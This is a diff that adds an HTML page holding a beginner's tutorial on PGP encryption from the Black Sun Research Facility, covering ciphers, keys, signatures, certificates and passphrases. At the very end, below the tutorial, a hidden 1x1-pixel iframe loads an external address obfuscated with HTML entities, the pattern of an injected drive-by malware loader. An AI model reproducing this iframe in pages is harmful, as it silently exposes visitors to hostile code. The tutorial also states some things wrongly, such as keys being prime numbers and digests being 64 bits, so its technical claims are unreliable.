@@ -1,0 +1,217 @@
+<html>
+<head>
+	<title>PGP Encryption for Beginners</title>
+	<style type="text/css">
+	a:active  {text-decoration:none;}
+	a:hover   {text-decoration:none;color:#999999;}
+	a:link    {text-decoration:none;}
+	a:visited {text-decoration:none;}
+	</style>
+</head>
+<body bgcolor="#000000" text="#CCCCCC" link="#99CCFF" vlink="#CCCCFF" alink="#CCFF99">
+<tt>
+PGP Encryption for Beginners<br>
+Version 1.1 | author: <a href="mailto:sainty@euroseek.com">the saint</a> & <a href="mailto:khopeson@icqmail.com">krans</a><br>
+Converted to HTML by <a href="mailto:aztek@nether.net">AZTEK</a><br>
+<a href="http://blacksun.box.sk">http://blacksun.box.sk</a><br>
+<br>
+<br>
+<pre>
+ ###########         #                   ###             #########      ##     #
+ ############       ###                 #####           ###  #####     ###     ##
+ #####    ####     #####               #######         ###    ###     ####    ###
+ #####    #####   #######             #########       ###      #      ####  ####
+  ####   #####    #######            ###########     ###               ### ####
+   #########      #######           ####     ####    ###               #######
+    ###########    #####           #####     #####    ###     ##      #######
+   #############    ###   ##      ######  #########    ###   ####     #########
+  ######     ####    #   ####      ########  #####      ##  ######     ###   ###
+ ######     ####     ##########     ####     ####        #########     ###  #####
+ #####     ####       ##########     ###     ###          #######     ####  ######
+ #############         ##########     ##     ##            #####      ####   ####
+ ###########            ########      ##     ##             ###        ###    ##
+
+   #######       #     #        #     #
+  ##########    ##     ##      ##     ##
+ ###    ###     ##     ##     ###     ###
+  ###    #     ###     ###   #####    ####           Black Sun Research Facility
+    ###         ##     ##    ######   ####             http://blacksun.box.sk
+      ###       ##     ##    #######  ####                 ASCII By : cyRu5
+   #   ###     ###     ###   ####  #######
+  ###  ####   ####     ####   ###   #####
+ ###########   ###########     ##    ###
+  #########      #######        #     #
+</pre>
+<br>
+<br>
+Contents<br>
+========<br>
+<br>
+<a href="#1">Why Encrypt?</a><br>
+<a href="#2">What is PGP?</a><br>
+<a href="#3">Introduction to Cryptography.</a><br>
+<a href="#4">Main Types of Cryptography.</a><br>
+<a href="#5">How Does Cryptography Work?</a><br>
+<a href="#6">Conventional Cryptography</a><br>
+<a href="#7">Public Key Cryptography</a><br>
+<a href="#8">How Does PGP Work?</a><br>
+<a href="#9">A Few Words About The Keys...</a><br>
+<a href="#10">..And About Digital Signatures</a><br>
+<a href="#11">The Message Digest</a><br>
+<a href="#12">Digital Certificates</a><br>
+<a href="#13">Certificate Formats</a><br>
+<a href="#14">Validity and Trust</a><br>
+<a href="#15">Passwords and Passphrases</a><br>
+<br>
+<a name="1">Why Encrypt?</a><br>
+============<br>
+<br>
+Why the hell would you want to encrypt your data anyway? Well, for several reasons:<br>
+<br>
+(1) Suppose someone breaks into your computer. Instead of being able to quickly grab all of your credit card numbers, passwords etc', if you've encrypted your data he will only get encrypted garbage, which will mean nothing to him, and will be excruciatingly hard to decipher.<br>
+<br>
+(2) Suppose you're not the only one using your computer. Would you risk putting your private information wide-open to strangers and maybe even malicious users? I wouldn't.<br>
+<br>
+I hope you get my drift. Now, let's move on.<br>
+<br>
+<a name="2">What is PGP?</a><br>
+============<br>
+<br>
+PGP (Pretty Good Privacy) - is an encrypting technology which combines features of both conventional and public key cryptography (the keys we will discuss later in this topic) and is sometimes called a hybrid cryptosystem.<br>
+<br>
+<a name="3">Introduction to Cryptography</a><br>
+============================<br>
+<br>
+At first, I would like to introduce you to some new words, which will be widely used in this tutorial:<br>
+<br>
+1. "Plain text" or "clear text" is unencrypted data, which can be read and easily understood and has not been encrypted. This tutorial is written in clear text, for example.<br>
+2. Encryption - the process of changing plain text into ciphertext.<br>
+3. Ciphertext - is the result of encryption - meaningless garbage at first sight. (One of the meanings is "an obsolete name for zero).<br>
+4. Decryption - it is a method to convert readable data from Ciphertext.<br>
+5. Cryptography - the science of encryption.<br>
+6. Cryptanalysis - a branch of mathematics that involves breaking encrypted data mathematically or statistically.<br>
+7. Attackers - anybody who tries to get cleartext from ciphertext without authorisation.<br>
+8. Cryptology - synonym for cryptography<br>
+9. Cipher  - an algorithm or mathematical function that converts plaintext to ciphertext.<br>
+10. Cryptosystem - a cipher and all the tools/algorithms associated with it<br>
+<br>
+Here is logical chain of all this process:<br>
+<br>
+<pre>
+PLAINTEXT --> ENCRYPTION --> CIPHERTEXT --> DECRYPTION --> PLAINTEXT<br>
+                                        \<br>
+                                          -> SUCCESSFUL ATTACK --> PLAINTEXT<br>
+</pre>
+<br>
+Cryptography actually is a mathematical science. It uses mathematics to encrypt / decrypt data in order to store it or to transfer it securely across an insecure network (the internet for example, but it could be any other type of network, not even the electronic type) to ensure that information is only available to authorized people.<br>
+<br>
+<a name="4">Main types of Cryptography</a><br>
+==========================<br>
+<br>
+A cryptosystem can be weak (easy to break), or it can be strong (hard to break). The strength of a cryptosystem is measured in the time and resources you need to get make a successful attack. Modern strong cryptosystems can withstand a brute force attack using all the computers in the world - or rather, it would take an inordinately long time (currently about 10^9 times the age of the universe). But you never know - tomorrow may bring a mathematical technique to attack these cryptosystems by a method other than brute force.<br>
+<br>
+<a name="5">How does Cryptography work?</a><br>
+===========================<br>
+<br>
+A cipher uses a key (a piece of data) coupled with an encryption algorithm to encrypt data (plain text). Different keys produce different ciphertext, of course. So the strength of encrypted data relies on two factors - the strength of cipher and the safety of the key. Therefore it is very advisable to choose the key very carefully and to keep it secure (best solution is to put it into a brain-cell, if possible:)). All those components mentioned above build a cipher. A cryptosystem (like PGP) uses a combination of various different ciphers .<br>
+<br>
+<a name="6">Conventional Cryptography</a><br>
+=========================<br>
+<br>
+This type of encryption uses the same key to encrypt and decrypt data (plaintext). An example of a conventional cryptosystem is DES (The Data Encryption Standard) which is recommended by the Federal Government for commercial applications (despite the fact that it can be broken very easily). Conventional Cryptography has both pluses and minuses. It is very fast and suitable for data which won't be used by anyone except by the person who encrypted it. Unfortunately the secure key distribution is very difficult task to accomplish: you need to agree with a key beforehand, which is very impractical nowadays, because you cannot trust phone companies, couriers, e-mail and internet services. Here arises a question: how do you get the key to the recipient without someone intercepting it? The best way would be to have different keys for the sender and recipient.<br>
+<br>
+<a name="7">Public Key Cryptography</a><br>
+=======================<br>
+<br>
+Which solves the secure key distribution problem. Whitefield Diffie and Martin Helman introduced the concept of Public Key Cryptography in 1975. However, there are some rumours that British Secret Intelligence Service invented it few years before, but kept in secret and did nothing with it.<br>
+Public key cryptography is an asymmetric system and uses two keys (a pair): a public key, used for encryption and a private key, used for decryption. The public key is published worldwide and the personal is kept in secret. Anyone and everyone can encrypt data with your public key, but only you (or to be more exact the person who has your private key) can decrypt the ciphertext.<br>
+<br>
+<a name="8">How Does PGP Work?</a><br>
+==================<br>
+<br>
+As mentioned above, PGP is mixed cryptosystem - that is, it combines both conventional and public key cryptography. PGP operates in this way:<br>
+<br>
+A) Encryption:<br>
+<br>
+1) First, PGP compresses plaintext. It is useful for several reasons: you need less space on hard disk. smaller message means saving time (and money), when sending it via internet, and increases the strength of encryption, because in compressed data there are fewer patterns than in uncompressed and pattern recognition is widely used by cryptanalists to break a cipher.<br>
+2) PGP then generates a single-use encryption key, known as a session key. It is random number, generated from random data such as the contents of your PC's RAM, mouse movements, positions of windows on the desktop - uou get the idea. PGP uses a very fast and secure conventional cipher (CAST) and this session key to encrypt the data to produce ciphertext.<br>
+3) After encrypting of the data, the session key is then encrypted to the recipient's public key and both the public key-encrypted session key and the ciphertext are transmitted.<br>
+<br>
+B) Decryption:<br>
+<br>
+1) PGP uses the recipient's private key to recover the session key.<br>
+2) The session key is used to decrypt the conventionally encrypted ciphertext.<br>
+3) The compressed data is decompressed.<br>
+<br>
+The combinations of conventional and public keys provide cryptography with very fast and secure encryption system. This is achieved by the speed of conventional algorithms and safety of public key.<br>
+<br>
+<a name="9">A Few Words About The Keys...</a><br>
+=============================<br>
+<br>
+A key is a piece of data which is used by cryptographic algorithm to produce cyphertext. In fact, keys are huge prime numbers. The size of the key is measured in bits - the bigger the key, the more secure the encryption. The comparison of conventional and public key sizes is rather puzzling - conventional 128-bit key is the same strength as 3072-bit public key. The thing is, that you can't compare those types of the key, because of the specific algorithms used for each type of cryptography. (you can't compare trains and brains, can you?).<br>
+To gain as much security as you can, always pick the biggest-size keys. This is because (given enough time and processing power) any public key can eventually be found. However, 2048-bit keys are in fact so difficult to break that it would take AT LEAST 2,000,000,000 years to break it using all the processing power to be found on the planet at the moment.<br>
+Keys are stored in encrypted form. Typically you use two keyrings (files on hard disk) - one for public keys and other for private. Don't lose private key ring, because all information which was encrypted to keys on that ring will never be accessible (if you won't compromise the cipher, of course).<br>
+<br>
+<a name="10">..And About Digital Signatures</a><br>
+==============================<br>
+<br>
+Just like written signatures, digital signatures provide authentication of the information's origin. Usually this feature of cryptography is much more widely used than encryption. The digital signature is 'impossible' to fake. In short - when you are dealing with this type of signature - you can mostly always be sure you are dealing with the right person (in the sense of authentication, of course).<br>
+The digital signature works this way:<br>
+1) The plaintext gets encrypted with your private key.<br>
+2) If the information can be decrypted with the public key of the yours, then that information comes from you.<br>
+<br>
+The digital signatures are the main way to verify the validation of the public key.<br>
+<br>
+<a name="11">The Message Digest</a><br>
+==================<br>
+<br>
+How do you make sure that no-one is able to just copy and paste your signature from your e-mail to his and claim it came from you? Well, you use a message digest.<br>
+<br>
+The message digest is the output of a hash function. This function takes message of any length and produces a fixed-length, 64-bit output (that's right - it's the same as the message digest hash mentioned earlier). The mathematical side of this function ensures that even if the data differs very slightly, you get entirely different output (known as a message digest). The private key and the digest are used to generate the signature, which is then transmitted along with plaintext. The hash function ensures that no one can take your signature and use it as his own because in such a case verification fails.<br>
+<br>
+<a name="12">Digital Certificates</a><br>
+====================<br>
+<br>
+Of course, when you use public key crytposystem you want to be sure you are encrypting to the right person's key. This is  the problem of the trust. Let's say someone posts a fake key with a name of the person who you are writing to. When you encrypt the data and send it to the "recipient", the data goes to the wrong person. In a public key environment, it is very important that you are sure you are using the public key of the intended recipient. One way out is to encrypt only to keys that the owner of has handed to you personally (on a floppy disk, for example). But this is very inconvenient - first, sometimes you don't even know the recipient and the second, what would you do if you need to send some data to a person who is not available physically - in a plane or anywhere else wher you can't meet them physically? Send a pigeon with a note?<br>
+Digital certificates simplify this task of checking that you have the correct key. A digital certificate is a piece of data that you can use like a normal physical certificate. This information is included with a person's public key to provide help to verifying the validity of the key. Certificates are used to prevent people substituting one person's key for another.<br>
+<br>
+A digital certificate consists of:<br>
+1) a public key<br>
+2) certificate information (some information about the user: name, ID and so on)<br>
+3) one or more digital signatures<br>
+<br>
+The digital signature on a certificate shows that some person approves the certificate information. The digital signature does not attest to the authenticity of the certificate as a whole; it vouches only that the signed identity goes along with the public key. In short - a certificate is a public key with several forms of ID attached, and approval from some other trusted individual(s). You get most of the benefits of digital certification when it is necessary to exchange public keys with someone else and it is impossible to do manually. Manual public key distribution has its advantages, but is useful only to a certain point. Sometimes it is necessary to put everything in one place - central storage, for instance, with exchange of public keys for anyone who need them. Systems that store such data are called Certificate Servers and systems that provide some additional key management features are called Public Key Infrastructures.<br>
+Certificate Servers (aka cert. server / key server) are nothing more than databases that allow users to submit and retrieve digital certificates. Such a server can and usually does provide some administrative features. These features enable a company to maintain its security policies and so on.<br>
+A Public Key Infrastructure contains the same the certificate storage facilities of a certificate server, but also provides certificate management facilities - the ability to issue, revoke, store, retrieve and trust certificates. PKI introduces the Certification Authority (CA), which is a person who has authorisation to issue certificates for some company's computer  users. A CA creates certificates and digitally signs them, using the CA's private key. If you trust the CA, you can almost always trust the holder of their certificate.<br>
+<br>
+<a name="13">Certificate Formats</a><br>
+===================<br>
+<br>
+A digital certificate is a collection of some identifying information imbedded together with a public key and the signatures of people who trust it's authenticity. PGP recognises two different certificate formats:<br>
+1) PGP certificates;<br>
+2) X.509 certificates.<br>
+<br>
+A PGP certificate consists of:<br>
+1) the PGP version number, which identifies the version of PGP program which was used to create the associated key.<br>
+2) The certificate holder's public key together with the algorithm of the key, which can be RSA or DH/DSS (recommended).<br>
+3) The certificate validity period which indicates when the certificate will expire;<br>
+4) The symmetric encryption algorithm for the key. This information indicates the encryption algorithm to which the certificate owner prefers to have information encrypted. These algorithms are CAST (recommended), IDEA or Triple-DES.<br>
+<br>
+<a name="14">Validity and trust</a><br>
+==================<br>
+<br>
+Validity is confidence that something (a public key or certificate, for example) belongs to its real owner. Validity is very important in public key systems where you must know if the certificate is authentic or not.<br>
+When you are sure that some certificate belongs to someone, you can sign the copy on your key ring to attest to the fact that you've checked the certificate and that it is an authentic one. If you export the signature to a certificate server others will know that you approved it. To believe someone who has signed approval of any certificate, you need to trust them.<br>
+You can check validity by meeting the intended recipient and taking the key from him physically. The other way is to use fingerprints. A PGP fingerprint is a hash of the certificate (similar to a message digest). All fingerprints are unique. It can appear as hexadecimal number or a series of biometric words, which are phonetically distinct. When you have fingerprints and know the voice of the owner, you can just call him and ask him to read his. But sometimes, you don't know the voice - in such cases you need to trust some third party, like a CA.<br>
+But don't forget that unless the owner of the key hands it to you personally you must trust some third party to tell you that this key is valid.<br>
+<br>
+<a name="15">Passwords and passphrases</a><br>
+=========================<br>
+<br>
+Almost everyday, when you are using computers you need to enter a secret combination of characters (a password) to access some information. So you should be familiar with the concept. If not, you have been reading the wrong tutorial.<br>
+A passphrase is a longer version of a password and is supposed to be more secure. A passphrase helps you to be more secure against dictionary attacks (compromising PGP will be covered in Part II - Compromising PGP). The best passphrases are relatively long and complex, containing non-alphabetic characters. PGP uses a passphrase to encrypt your private key on your disk using a hash of your passphrase as the secret key. You use the passphrase to decrypt and use your private key. A<br>
+passphrase should be hard for you to forget and difficult for others to guess. It should be something already firmly embedded in your long-term memory, rather than something you make up from scratch, because without your passphrase your private key is totally useless and nothing can be done about it. At all.<br>
+</tt>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
